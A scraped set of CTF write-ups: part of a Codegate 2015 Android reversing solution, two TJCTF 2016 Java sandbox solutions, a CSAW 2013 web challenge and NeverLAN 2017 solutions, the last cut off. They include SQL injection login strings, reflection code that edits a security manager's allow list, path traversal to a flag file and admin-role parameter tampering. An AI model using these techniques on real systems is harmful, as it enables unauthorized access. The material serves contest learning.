c: public string a(string arg9) {     byte[] v5 = f.a(arg9);     stringbuilder v6 = new stringbuilder();     int v7 = v5.length;     int v4;     for(v4 = 0; v4 < v7; ++v4) {         int v2 = 0;         int v3 = v5[v4];         while(v2 < 8) {             int v0 = (v3 & 128) == 0 ? 0 : 1;             abc.crackme.e.a(v6, v0);             v3 <<= 1;             ++v2;         }     }     return j.b(v6); }  public boolean b(string arg10) {     int v2;     int v3;     a.f[] v4;     int v8 = 128;     boolean v0 = true;     __monitor_enter(this);     try {         if(abc.crackme.e.a() != null) {             v4 = new a.f[128];             v3 = 0;             while(true) {             label_9:                 if(v3 < v8) {                     if(i.a(arg10, v3) == 49) {                         v2 = 1;                     }                     else {                         goto label_41;                     }                     goto label_14;                 }                 else {                     goto label_25;                 }             }         }         else {             goto label_36;         }         goto label_34;     }     catch(throwable v0_1) {         goto label_39;     } label_41:     v2 = 0;     try {     label_14:         v4[v3] = new a.f();         v4[v3].a = v3 + 1;         v4[v3].b = ((double)v2);         ++v3;         goto label_9;     label_25:         if(m.a(k.a(), v4, new double[]{-1}) < 1) {             goto label_36;         }         goto label_34;     }     catch(throwable v0_1) {     label_39:         __monitor_exit(this);         throw v0_1;     } label_36:     v0 = false; label_34:     __monitor_exit(this);     return v0; }  public boolean c(string arg4) {     boolean v0 = false;     if(l.a(arg4) == 16) {         v0 = i.a(this, i.a(this, arg4));     }     return v0; } guess again:  \u2013 function c() checks the length of input, should be 16.  \u2013 function a() transform a string into a binary sequence.  \u2013 function b() checks if the value of binary sequence is correct. the most critical code is: if(m.a(k.a(), v4, new double[]{-1}) < 1)     v0 = false; but the lack of semantic information of m.a() and k.a() prevents us from having a deeper understaning about this app. now we have done everything we could with existing materials, fixing the libaurorabridge seems to be hard in a short time. but it\u2019s too early to give up, we need more clues to keep moving. we use our dynamic android analysis system\u2014indroid(you can get more information about this tools through our papa:dias: automated online analysis for android applications  @cit2014) to grap the runtime information of  this app, we add aurorabridge.a(), a.m.a(), a.k.a(), abc.crackme.a(), abc.crackme.b(), abc.crackme.c() into monitoring list and run this app with the input \u201c1111111111111111\u201d. from the end of the trace file(you can find the trace file at the end of this write-up), we find some data that confirmed our previous guess about the obfuscated code\uff1a besides that, we find m.a(k.a(), v4, new double[]{-1} uses lots of java.lang.math.exp() to calculate our input string, we have no idea what this means, but we are sure it\u2019s some kind of compare. checking the trace file again, we find some suspicious data in this form: we find it\u2019s a 128-length array of \u20181\u2019 or \u20180\u2019: 1:0 2:1 3:0 4:1 5:0 6:0 7:1 8:1 9:0 10:1 11:0 12:1 13:1 14:1 15:1 16:0  17:0 18:0 19:1 20:1 21:1 22:0 23:1 24:0 25:0 26:1 27:0 28:0 29:0 30:1 31:0 32:0  33:0 34:0 35:1 36:0 37:1 38:0 39:0 40:0 41:0 42:0 43:1 44:1 45:0 46:0 47:0 48:0  49:0 50:0 51:1 52:1 53:0 54:0 55:0 56:0 57:0 58:0 59:1 60:1 61:0 62:1 63:1 64:1  65:0 66:0 67:1 68:0 69:1 70:0 71:0 72:1 73:0 74:1 75:1 76:1 77:0 78:0 79:1 80:1  81:0 82:1 83:1 84:0 85:1 86:0 87:1 88:1 89:0 90:1 91:1 92:1 93:1 94:0 95:0 96:1  97:0 98:1 99:0 100:0 101:0 102:1 103:1 104:0 105:0 106:1 107:1 108:0 109:0 110:0 111:0 112:1 113:0 114:1 115:1 116:0 117:1 118:1 119:0 120:0 121:0 122:1 123:1 124:0 125:1 126:1 127:0 128:1 it seems to be a 16-length string, turns out to be \u201cs^:d(007)skyfalm\u201d after decoded. wow! may be it\u2019s the flag! unfortunately, it\u2019s wrong. but this string looks meaningful, there must be something wrong. we check the trace file over and over, and find another more suspicious data\uff1a what do you think of when you see \u201c 1f b8 \u201d? yes, it\u2019s a gzip file. we can also find the call of java api java/util/zip/gzipinputstream in the trace file. so, let\u2019s unzip it: here another 127 arrays of length 128 and some strings looks like command and args. we write a script to decode all the arrays: now we think we finally find what the app really do, it\u2019s running some kind of machine learning algorithm, calculating the distance betweent the input and these strings. the most frequency occurring character in each position comprise the flag \u201cs^:d(007)skyfall\u201d appendix apk file http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/dodocrackme2.apk real dex file http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/out.dex libaurorabridge http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/libaurorabridge.so libaurorabridge.so after initialization(dump from memory) http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/aurora.so indroid trace http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/trace.7z decode script http://loccs.sjtu.edu.cn/~evermars/dodocrackme2/decode.py posted by evermars mar 17 , 2015 codegate reverse writeup \u00ab bctf 2014 crypto 300 \u6bd4\u7279\u5e01\u94b1\u5305 comments please enable javascript to view the comments powered by disqus. recent posts codegate 2015 reverse 400 dodocrackme2 bctf 2014 crypto 300 \u6bd4\u7279\u5e01\u94b1\u5305 bctf 2014 misc 300 \u8bf1\u6355\u9677\u9631 bctf 2014 misc 200 \u5185\u7f51\u63a2\u9669 hack.lu ctf 2013 exploiting 400 wannabe copyright \u00a9 2015 - 0ops - powered by octopress . design by octopress themes",
    "title": "dodocrackme2",
    "url": "http://blog.0ops.net/blog/2015/03/17/codegate-2015-dodocrackme2/"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "",
    "meta_og_title": "",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 41.64352053637552,
    "tag_title": "",
    "tags": "",
    "text": "tjctf 2016 writeups introduction r u insane? (5 pts) znzarmt mvd hproo (10 pts) one time subtraction (20 pts) reversing (20 pts) doge 1 (30 pts) nowisitreally (30 pts) super questionable luggage service (30 pts) doge 2 (35 pts) cipher font (50 pts) financial transaction (50 pts) a hundred captchas (60 points) rsa 1 (60 pts) basic images (65 pts) curses and hex-es (65 pts) i can see right through you! (65 pts) use the force (80 pts) time travel (90 pts) torrent (90 pts) rsa 2 (90 pts) gravitymud (90 pts) java sandbox (100 pts) may 1st, 2060 (100 pts) roverctl (100 pts) sketchy airlines (100 pts) guess (120 pts) corruption (130 pts) crucible (140 pts) earphones (155 pts) tsundere (160 pts) oneshot (170 pts) blag (180 pts) httc (190 pts) curvature2 (200 pts) published with gitbook title java sandbox (100 pts) java sandbox (100 pts) problem everyone&apos;s heard of python jail escapes, but what about java? java sandbox solution at first, we are presented with a login portal. we try a random username and password, and a message in the corner appears to try mysql injection. we then login successfully with the username &apos; or &apos;&apos;=&apos; and password &apos; or &apos;&apos;=&apos; at this point we reach a page where we can type, then submit a java program to compile and run it. in the security page, we are told that the flag resides at /var/www/flag.txt . we created a small java program to attempt to read this flag: import java.io.bufferedreader; import java.io.filereader; public class main public static void main (string[] args) throws exception {         bufferedreader read = bufferedreader( filereader( \"/var/www/flag.txt\" ));         system.out.println(read.readline());     } } however, when we submit this program, we get an error message saying that access was denied by the security manager, and we don&apos;t have permissions to read it. we then see that source for the custom security manager and the program wrapper is available on the security page as well: import java.lang.reflect.method; import java.security.permission; import java.util.arraylist; import java.util.arrays; class customsecuritymanager extends securitymanager {     arraylist<string> allow;     string insecureclassname;     string[] allowedlibraries = string[] { \"com.google\" \"twitter4j\" \"com.securefiledownloader\" public customsecuritymanager (string classname, string[] allowed) {         insecureclassname = classname;         allow = arraylist<string>(arrays.aslist(allowed)); // allow standard jre libraries allow.add(system.getproperty( \"java.home\" ));     } public boolean checkallow (string str) (string i : allow) { (str.startswith(i)) return true ;         } return false ;     } public boolean islibrary {         stacktraceelement[] stack = thread.currentthread().getstacktrace(); (stacktraceelement s : stack) { // reached end +s).startswith( \"wrapper\" ) || ( +s).startswith(insecureclassname)) { return false ;             } // pass cases that obviously aren&apos;t libraries +s).startswith( \"customsecuritymanager\" ) || ( +s).startswith( \"java.\" ) || ( +s).startswith( \"sun.\" )) { continue ;             } (string x : allowedlibraries) { +s).startswith(x)) { return true ;                 }             }         } return false ;     } @override public void checkpermission (permission perm) (perm instanceof java.io.filepermission) { (!perm.getactions().equals( \"read\" )) { throw securityexception( +perm);             } // allow trusted libraries to access files (!islibrary()) { (!checkallow(perm.getname())) { throw securityexception( \"file access denied! \" +perm);                 }             }         } else (perm instanceof java.net.socketpermission || perm instanceof java.net.netpermission || perm instanceof javax.net.ssl.sslpermission) { // allow trusted libraries to access the internet (!islibrary()) { // need this to create urls (!perm.getname().equals( \"specifystreamhandler\" )) { throw securityexception( \"socket access denied! \" +perm);                 }             }         } else (perm instanceof java.lang.runtimepermission) { (perm.getname().equals( \"setsecuritymanager\" ) || perm.getname().equals( \"createsecuritymanager\" )) { throw securityexception( \"nope! \" +perm);             } (perm.getname().equals( \"createclassloader\" ) || perm.getname().equals( \"preferences\" )) { throw securityexception( \"nah... \" +perm);             } (perm.getname().equals( \"queueprintjob\" )) { throw securityexception( \"why... \" +perm);             }         } else (perm instanceof java.security.securitypermission) { throw securityexception( \"permission denied! \" +perm);         } else (perm instanceof java.sql.sqlpermission || perm instanceof java.util.logging.loggingpermission || perm instanceof java.awt.awtpermission) { // just in case... throw securityexception( \"permission denied! \" +perm);         } // i think thats everything import java.lang.reflect.method; public class wrapper public static void main (string[] args) {         args[ \"main\" // args[0] is the name of the class to run // args[1] is a colon separated list of directories your program can access system.setsecuritymanager( customsecuritymanager(args[ ], args[ ].split( ))); {             class<?> unsafeclass = classloader.getsystemclassloader().loadclass(args[ ]);             method m = unsafeclass.getmethod( \"main\" , string[].class);             m.invoke( null object[] { string[] {}});         } catch (exception e) {             e.printstacktrace();         }     } } upon analysing this, we see that access to the file is restricted because its path is not in the allow list. from the wrapper class, we see that customsecuritymanager is in the same namespace as where \"main\" (the uploaded class) is located. this means we can reference the customsecuritymanager directly. we then run the following code and successfully read the flag: import java.io.bufferedreader; import java.io.filereader; import java.util.list; public class main public static void main (string[] args) throws exception {         customsecuritymanager csm = (customsecuritymanager)system.getsecuritymanager(); //get instance of the customsecuritymanager class system.out.println(csm.allow);         list<string> allow = csm.allow; //add to the allow list allow.add( \"/var/www/flag.txt\" );         system.out.println(allow);         bufferedreader read = bufferedreader( filereader( \"/var/www/flag.txt\" ));         system.out.println(read.readline());     } } flag tjctf{j4v4_r3fl3c710n_15_7r1cky} results matching \" no results matching \"",
    "title": "Java Sandbox",
    "url": "https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/java_sandbox_100_pts.html"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "java sandbox \ubb38\uc81c\ub294 \uac04\ub2e8\ud55c sql injection\uc744 \uac70\uce5c\ud6c4\uc5d0 \uc790\ubc14 \uc0cc\ub4dc\ubc15\uc2a4\uac00 \ub4f1\uc7a5\ud55c\ub2e4. \uc6f9\ud398\uc774\uc9c0\uc5d0\uc11c\ub294 \ub2e4\uc74c\uacfc\uac19\uc740 \ucffc\ub9ac\ub85c \uc0cc\ub4dc\ubc15\uc2a4\ub85c \uc811\uadfc\ud558\uba74\ub41c\ub2e4. [ Query ] ' or '1'='1-- \uac04\ub2e8\ud558\uac8c \uc0cc\ub4dc\ubc15\uc2a4\ub85c \uc811\uadfc \ud560 \uc218 \uc788\uc73c\uba70, \uc911\uc694\ud55c\uac74 \ud544\ud130\ub9c1\uc774 \uc874\uc7ac\ud558\ub294 \uc790\ubc14\uc0cc\ub4dc\ubc15\uc2a4\uc774\ub2e4. \ud50c\ub798\uadf8\ub294 /var/www/\uc548\uc5d0 \uc874\uc7ac\ud55c\ub2e4. Directory web File Wrapper.java File Dockerfile File flag.txt Directory etc File runapi.py File php.ini Directory html /*..",
    "meta_og_title": "TJCTF - Java sandbox",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 41.19877753332904,
    "tag_title": "",
    "tags": "web",
    "text": "begin opengraph end opengraph begin twittercard end twittercard begin daumapp end daumapp begin structured_data end structured_data [if lt ie 9]>     <script src=\"http://t1.daumcdn.net/tistory_admin/lib/jquery-1.11.3.min.js\"></script> \t<![endif] [if gte ie 9]><! <![endif] \uc6f9\uc811\uadfc\uc131\uc6a9 \ubc14\ub85c\uac00\uae30 \ub9c1\ud06c \ubaa8\uc74c \ubcf8\ubb38 \ubc14\ub85c\uac00\uae30 \uce74\ud14c\uace0\ub9ac\ubc84\ud2bc \ud074\ub9ad\uc2dc 'navi_on' \ud074\ub798\uc2a4 \ubd80\uc5ec s0ngsari \uce74\ud14c\uace0\ub9ac \uac80\uc0c9\ud558\uae30 \uac80\uc0c9\ud558\uae30 search s0ngsari s0ngsari \ubd84\ub958 \uc804\uccb4\ubcf4\uae30 (463) \uc790\uc720\ub9cc\ub2f4 (63) c/c++ (10) python (40) linux network hack (166) pwnable (83) reversing (56) windows (14) bughunting (91) (13) (11) pwnable.kr (26) \ub9cc\ub4e4\uba74\uc11c \ubc30\uc6b0\ub294 os\ucee4\ub110\uc758\uad6c.. exploit-exercise (15) overthewire smashthestack root-me.org profile guestbook \uacf5\uc9c0\uc0ac\ud56d notice \ucd5c\uadfc\uc5d0 \uc62c\ub77c\uc628 \uae00 recent posts file stream pointer\uc5d0 \uad00.. seccon \uac14\ub2e4\uc640\uc11c \uc5c4\uccad\ub09c\ubd84.. pwnable.tw deathnote pwnable.tw orw \ucd5c\uadfc\uc5d0 \ub2ec\ub9b0 \ub313\uae00 recent comments \uc131\uc9c0\uc21c\ub840 \uc654\uc2b5\ub2c8\ub2e4. \uc9f1\ud574\ucee4 \ub418.. \uc774\uae00\uc740 \uc774\uc81c \uc131\uc9c0\uc21c\ub840\uac00 \ub429\ub2c8.. \ub2f5\ubcc0 \uac10\uc0ac\ud569\ub2c8\ub2e4 \u314e\u314e\u314e \uadf8\ub7fc.. \uc544\ub1e8\uc544\ub1e8 \ud799\uccad\ud06c\ub294 prevsize+.. link 2017/05 \ud0dc\uadf8 \ud074\ub77c\uc6b0\ub4dc tags \uc708\ub3c4\uc6b0\uc988 \uc258\ucf54\ub4dc\uc5d0\ub7ec gdb one line nc\ud504\ub85c\uadf8\ub7a8 \uc708\ub3c4\uc6b0\uc988 \uc258\ucf54\ub4dc \ud654\ud587 2015 gdb command gdb command line \uc708\ub3c4\uc6b0\uc988 exit ntdll \ub300\ud68c\uc11c\ubc84 nc\uad6c\ucd95 local privilege escalation mac vuln nc \uc11c\ubc84 \ub85c\uceec\uad8c\ud55c\uc0c1\uc2b9 \ud654\uc774\ud2b8\ud587 \ucf58\ud14c\uc2a4\ud2b8 \ub9e5 \ucde8\uc57d\uc810 netcat\uc11c\ubc84 more \uae00 \ubcf4\uad00\ud568 archives 2017/01 (18) 2016/12 (23) 2016/11 (28) 2016/10 (19) 2016/09 (16) \ubc29\ubb38\uc790\uc218 today total 28,878 \uad00\ub9ac \uba54\ub274 s0ngsari tjctf - java sandbox \ubcf8\ubb38 tjctf - java sandbox s0ngsari 2016.05.31 22:45 java sandbox \ubb38\uc81c\ub294 \uac04\ub2e8\ud55c sql injection\uc744 \uac70\uce5c\ud6c4\uc5d0 \uc790\ubc14 \uc0cc\ub4dc\ubc15\uc2a4\uac00 \ub4f1\uc7a5\ud55c\ub2e4. \uc6f9\ud398\uc774\uc9c0\uc5d0\uc11c\ub294 \ub2e4\uc74c\uacfc\uac19\uc740 \ucffc\ub9ac\ub85c \uc0cc\ub4dc\ubc15\uc2a4\ub85c \uc811\uadfc\ud558\uba74\ub41c\ub2e4. [\u00a0 query \u00a0] ' or '1'='1-- \uac04\ub2e8\ud558\uac8c \uc0cc\ub4dc\ubc15\uc2a4\ub85c \uc811\uadfc \ud560 \uc218 \uc788\uc73c\uba70, \uc911\uc694\ud55c\uac74 \ud544\ud130\ub9c1\uc774 \uc874\uc7ac\ud558\ub294 \uc790\ubc14\uc0cc\ub4dc\ubc15\uc2a4\uc774\ub2e4. \ud50c\ub798\uadf8\ub294 /var/www/\uc548\uc5d0 \uc874\uc7ac\ud55c\ub2e4. directory web file wrapper.java file dockerfile file flag.txt directory etc file runapi.py file php.ini directory html /* package whatever; // don't place package name! */ import java.util.* import java.lang.* import java.io.* import java.util.* import java.nio.charset.charset import java.nio.file.files import java.nio.file.path import java.nio.file.paths public class main public static void main string args throws java.lang exception // your code goes here string curdir system getproperty( \"user.dir\" string targetdir curdir \"/../../var/www/\" file folder file (targetdir); file [] listoffiles folder listfiles(); listoffiles length; i (listoffiles[i] isfile()) { system println( \"file \" listoffiles[i] getname());       } else (listoffiles[i] isdirectory()) { system println( \"directory \" listoffiles[i] getname());       }     } list<string> strlist files readalllines( paths get(targetdir, \"flag.txt\" charset forname( \"iso-8859-1\" string strlist) { system println(str);     }         } catch exception e)         {             e printstacktrace();         }     } } <rdf:rdf xmlns=\"http://web.resource.org/cc/\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> \t\t<work rdf:about=\"\"> \t\t\t<license rdf:resource=\"http://creativecommons.org/licenses/by-fr/2.0/kr/\" /> \t\t</work> \t\t<license rdf:about=\"http://creativecommons.org/licenses/by-fr/\"> \t\t\t<permits rdf:resource=\"http://web.resource.org/cc/reproduction\"/> \t\t\t<permits rdf:resource=\"http://web.resource.org/cc/distribution\"/> \t\t\t<requires rdf:resource=\"http://web.resource.org/cc/notice\"/> \t\t\t<requires rdf:resource=\"http://web.resource.org/cc/attribution\"/> \t\t\t<permits rdf:resource=\"http://web.resource.org/cc/derivativeworks\"/> \t\t</license> \t</rdf:rdf> \uce74\uce74\uc624\uc2a4\ud1a0\ub9ac \ud398\uc774\uc2a4\ubd81 ' \uce74\ud14c\uace0\ub9ac\uc758 \ub2e4\ub978 \uae00 secuinside 2016 cykor_00001_patch 2016.07.10 backdoor ctf - enter the matrix 2016.06.07 tjctf - java sandbox 2016.05.31 tjctf - gravitymud 2016.05.30 defcon 24 - legit 1,2,3 patched 2016.05.23 defcon 24 - easy_prasky 2016.05.23 \uacf5\uc720\ud558\uae30 \ub9c1\ud06c \ud398\uc774\uc2a4\ubd81 \uce74\uce74\uc624\uc2a4\ud1a0\ub9ac 'ctf' related articles secuinside 2016 cykor_00001_patch 2016.07.10 backdoor ctf - enter the matrix 2016.06.07 tjctf - gravitymud 2016.05.30 defcon 24 - legit 1,2,3 patched 2016.05.23 more comments \ub313\uae00\uc4f0\uae30 \ud3fc \ube44\ubc00\ubc88\ud638 secret send prev next blog is powered by kakao / designed by tistory \ud2f0\uc2a4\ud1a0\ub9ac \ud234\ubc14 daum tistory",
    "title": "Java Sandbox",
    "url": "http://s0ngsari.tistory.com/entry/TJCTF-Java-sandbox"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "",
    "meta_og_title": "",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 37.92185125943859,
    "tag_title": "",
    "tags": "",
    "text": "blog archives feed blog.sploit.de csaw ctf 2013 - web 300 - herpderper monday, september 23, 2013 csaw stratum auhuur web 300 challenge of csaw ctf 2013 description herpderper.apk late hint: \"hint for herpderper: simple web bugs are simple.\" tools: dex2jar jd-gui apktool convert the apk using dex2jar, unzip, analyze app stucture using jd-gui. the only request that is ever send is done in ops.black.herpderper.authrequest.doinbackground(string[]) which for some reason cannot be decompiled. (we couldn't get the app to install on an android emulator and on several phones indicating that the bytecode had been manipulated). however, disassembling was possible: i disected that method using the disassembled dex file (apktool), as i found it easier to understand (dalvik is a register machine with virtually unlimited registers, while jvm is a stack machine).  as i never read more than minimal examples of assembler before, i turned doinbackground to pseudocode first: 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 protected doinbackground string android debug isdebuggerconnected short 0x539 else java java catch java malformedurlexception java httpurlconnection openconnection assert instanceof java httpurlconnection setdooutput \"post\" setrequestmethod black herpderper trustmodifier relaxhostchecking getoutputstream \"utf-8\" getbytes string android util base64 encodetostring \"utf-8\" getbytes string android util base64 encodetostring \"\\n\" replace \"\\r\" replace \"\\n\" replace \"\\r\" replace stringbuilder \"identity=\" append append \"&secret=\" append append \"&integrityid=\" append append tostring getbytes write close connect catch exception getinputstream bufferedinputstream java inputstreamreader bufferedreader java lang stringbuilder while true readline // break? -> :cond_1 append else tostring disconnect return catch apache http client clientprotocolexception disconnect catch java lang exception doinbackground takes an array of strings representing the url, the mail address, password and apk signature. it does only post requests to one url: https://webchal.isis.poly.edu/csaw.php parameters: 1 2 3 identity = base64(email) secret = base64(password) integrityid = apk signature i used a java program i found somewhere to generate the needed apk signature: 3082019f30820108a0030201020204522f840b300d06092a864886f70d0101050500301431123010060355040b1309426c61636b204f7073301e170d3133303931303230343134375a170d3338303930343230343134375a301431123010060355040b1309426c61636b204f707330819f300d06092a864886f70d010101050003818d0030818902818100cf6ecf73522d132c654ba9d9448e3051099e16283b68ef7872779e29cf517cbdb9dbeadced28147b8bc0e2cf93a02aff855561258a20cf107fe79fc1b56479fd706760f8a6a5bdeba2dc9ea810c5b7954fea9b62d96f3d66743b7723f57578e814939a23262be7bdd0aca74cfc0bd06ec8e267861161075d00edd29e1ed7d29d0203010001300d06092a864886f70d0101050500038181003289f625b0d425dd9eb49c7d5113f3f9f39d72dd56c56684aeeede3e8e99aaf279b9e5c994b4f8f1d5ecb0941ffb7cb8dd3fa58c60926127ebe2a85531c1c1885f9ae588af1bd91ebc3ce41259818569663d9ec66cdbfb08993e20c046b2dcd0ca54e52e84dc1866c824a586ce452750b9df09c2a5fca4a05e3746db3aae9fa9 requests which lack all three parameters are replied with: <html><body> please access the site using the mobile application </body></html> unless the integrityid is correct, the reply is: \"response\" \"status\" \"failure\" \"msg\" \"client integrity fault\" logging in with any identity and secret returns: \"response\" \"status\" \"failure\" \"msg\" \"login failed\" \"timestamp\" \"1379429423\" \"tz\" \"america/new_york\" \"reqresourceid\" \"webchal.isis.poly.edu\" \"clientid\" \"identitysig\" \"d033e22ae348aeb5660fc2140aec35850c4da997\" \"role\" \"anonymous\" \"accesstoken\" \"ywrtaw46yw5vbnltb3vzondlymnoywwuaxnpcy5wb2x5lmvkdq==\" after some fiddling we found out that you could set an additional parameter \"role\" to base64('admin') which in combination with both identity and secret set to the same value yielded the key: \"response\" \"status\" \"success\" \"msg\" \"key: yo dawg i heard you leik to derp so i put a herp in your derp so you could herpderp while you derpderp\" \"timestamp\" \"1379429491\" \"tz\" \"america/new_york\" \"reqresourceid\" \"webchal.isis.poly.edu\" \"clientid\" \"identitysig\" \"d033e22ae348aeb5660fc2140aec35850c4da997\" \"role\" \"admin\" \"accesstoken\" \"ywrtaw46ywrtaw46d2viy2hhbc5pc2lzlnbvbhkuzwr1\" the site uses a self-signed certificate, but which you could have mitm'ed because of bad certificate checking in the app (only reproducible parts of the certificate are checked), but we didn't successfully pursue that. += 300 powered by mynt",
    "title": "Web 300",
    "url": "http://blog.sploit.de/2013/09/23/csaw-ctf-2013-web300/"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "Informations\nVersion\n\n\n\nBy\nVersion\nComment\n\n\n\n\nnoraj\n1.0\nCreation\n\n\n\nCTF\n\nName : NeverLAN CTF 2017\nWebsite : neverlanctf.com\nType : Online\nFormat : Jeopardy\nCTF Time : link\n\n50 - Encoding Apprentice -",
    "meta_og_title": "NeverLAN CTF 2017 - Write-ups",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 37.92185125943859,
    "tag_title": "",
    "tags": "",
    "text": "security is everywhere home linux news security about security writeups neverlan ctf 2017 - write-ups monday 27 february 2017 (2017-02-27) forensics security writeups informations version version comment noraj creation name : neverlan ctf 2017 website neverlanctf.com type : online format : jeopardy ctf time link 50 - encoding apprentice - trivia what common encoding practice\u2019s title contains the square of 8 and occasionally ends with an \u201c=\u201d, or \u201c==\u201d? answer: base64 50 - shifty ciphers\u2026 - trivia what cipher is the shiftiest of them all? he even has his own salad\u2026 answer: caesar 50 - know your extensions - trivia unix and linux use this (instead of a file extension) to determine what format a file is. answer: magic numbers 50 - mmmm... ssl - trivia what is the standard, secure, size of an ssl certificate? answer: 2048 50 - don't eat me - trivia i allow http to act as a stateful protocol instead of the stateless protocol it actually is. just a small piece of data sent from a website... answer: cookie 50 - neverlan - recon we've been known to leak things on twitter... go to neverlanctf twitter: https://twitter.com/neverlanctf there is an interesting twitter status rnfl erpba vf rnfl. synt{vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel} #commoncaesercipher i tried a rot13 and i got that: easy recon is easy. flag{inf0rmation_is_p0wer_kn0w_y0ur_adversary} flag is inf0rmation_is_p0wer_kn0w_y0ur_adversary 100 - purvesta - recon purvesta also really likes his twitter... neverlan ctftime page: https://ctftime.org/team/32118 purvesta ctftime page: https://ctftime.org/user/23157 purvesta name is: tanner purves , his linkedin page is not working. so i searched for twitter tanner purves and found his twitter page @purvesta0704 his twitter descripton says: \\\\\\bsu &apos;20, co-founder of the neverlan ctf/// {zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=} it looks like a base64 string: $ printf %s &apos;zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=&apos; | base64 -d flag{w0w_y0u_ar3_getting_g00d_at_thi5} 50 - soyoulikemusic - forensics soyoulikemusic.class we can use strings on the java class: $ strings soyoulikemusic.class scan ljava/util/scanner; <init> code linenumbertable main ([ljava/lang/string;)v decompilingthecodenow qone stackmaptable qtwo qthree playgame sourcefile soyoulikemusic.java java/util/scanner oahh welcome... so i hear you like music? what might i call you fellow listener? java/lang/stringbuilder well 4, let&apos;s play a game and see how much you like music. uwho was the special artist to dj music for our live streams before the event started? s7a73farm try again... @now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep =final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap |i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) ;great let&apos;s play! (ctrl-c if you really don&apos;t want to play) congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= soyoulikemusic java/lang/object java/lang/string java/lang/system ljava/io/inputstream; (ljava/io/inputstream;)v ljava/io/printstream; java/io/printstream println (ljava/lang/string;)v nextline ()ljava/lang/string; trim append -(ljava/lang/string;)ljava/lang/stringbuilder; tostring equals (ljava/lang/object;)z equalsignorecase (ljava/lang/string;)z exit (i)v focus on: congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= that looks like base64: printf %s &apos;8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; |base64 -d \ud927\udc45\ufffd\ufffdm\u0465\ufffd\ufffd}]\ufffd\ufffd\u0465\ufffd\ufffd}=\ufffd}\ufffd\ufffd\ufffd\u0655\ufffd\u0444\ufffd\ufffd}5\ufffd\ufffd\u0445\ufffd\ufffd\ufffdbase64: invalid input that's wrong let's execute the java class, we know teh answers: $ java -cp . soyoulikemusic ahh welcome... so i hear you like music? what might i call you fellow listener? alex well alex, let&apos;s play a game and see how much you like music. i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) great let&apos;s play! (ctrl-c if you really don&apos;t want to play) who was the special artist to dj music for our live streams before the event started? s7a73farm now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap congratulations!! you did it!! zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= there was only a before our base64 string: $ printf %s &apos;zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; | base64 -di flag{still_waiting_on_purvesta&apos;s_mixtape} note : this is not forensics. 300 - just-a-selfie - forensics you've been put in charge of a very secret project. there's talk that some of your data has leaked out. your security analyst has flagged this email as \"out of place\". has your company been breached? hmm.. binwalk. now that's a useful tool! $ file email.txt email.txt: smtp mail, ascii text this is a mail with a attached image. --apple-mail=_9c94b8c8-a2cf-4892-8e1b-a89a4c3eae03 content-transfer-encoding: base64 content-disposition: inline; filename=selfie.jpg content-type: image/jpeg; x-unix-mode=0644; name=\"selfie.jpg\" content-id: < [email\u00a0protected] the image is base64 encoded, and split between line 92 and line 12617. of course, binwalk is useless here: 1369          0x559           html document header 4003          0xfa3           html document footer 9689          0x25d9          unix path: /wqckbqxdjshoqrujuixzonp/kk81v7p/kjzn4bfg73qguf/0pu9 11085         0x2b4d          unix path: /4rd4z6zcuzzplnxirjby/i/qgv9n/dfxvl4aeo+t0 13229         0x33ad          unix path: /enn/y/huxtvl8wx5yrjljz/xfcvzqtpdqfrph3dhfzntj8ek7l4h3 13284         0x33e4          unix path: /nakvugimce9bjok2f2dpax8c/f/w/p+zfd9pw4ka4+sp5mz7dk8oeijhsjktn7js/sc0pxnmnsl 14560         0x38e0          unix path: /wcei0l/aj8i/wdvqtxbcooy/ktz6uv2 15287         0x3bb7          unix path: /qk6f4i/c/vfhgu/wbs+mdbxxmhweuzirfiuagaquon1p0rxlrvlc+hdp6rri8rvvdfhtxrpk8h 22696         0x58a8          unix path: /8e/ke8hmukjewaobkde/9c/jvzihnpfvmr2or8qzwppjhfvqm7ngjsdwt 23242         0x5aca          unix path: /jivyx2f9h6ljj/p/j/gvqmszd+0kcm1zrcqbhuh7wgielgamcy 25527         0x63b7          unix path: 